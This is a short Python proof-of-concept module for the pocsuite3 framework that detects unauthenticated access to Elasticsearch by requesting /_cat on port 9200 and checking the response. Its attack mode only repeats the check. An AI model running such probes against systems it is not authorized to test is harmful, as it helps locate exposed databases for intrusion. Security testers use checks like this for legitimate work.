# -*- coding:utf-8 -*-

from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, OptString, POC_CATEGORY
from urllib.parse import urlparse

class DemoPOC(POCBase):
    vulID = ""
    version ='1'
    author = ["LMX"]
    vulDate = ""
    createDate = "2022-2-15"
    updateDate = "2022-2-15"
    references =[]
    name ="elasticsearch 未授权访问"
    appPowerLink = ''
    appName = 'elasticsearch'
    appVersion = ' '
    vulType = '未授权访问'
    desc = '''
    elasticsearch 未授权访问漏洞
    '''

    def _verify(self):
        result ={}
        pr = urlparse(self.url)
        try:
            url = 'http://' + pr.hostname + ':9200/_cat'
            r = requests.get(url=url, timeout=5)
            if '/_cat/master' in r.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
        except Exception as e:
            pass
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        return self._verify()
register_poc(DemoPOC)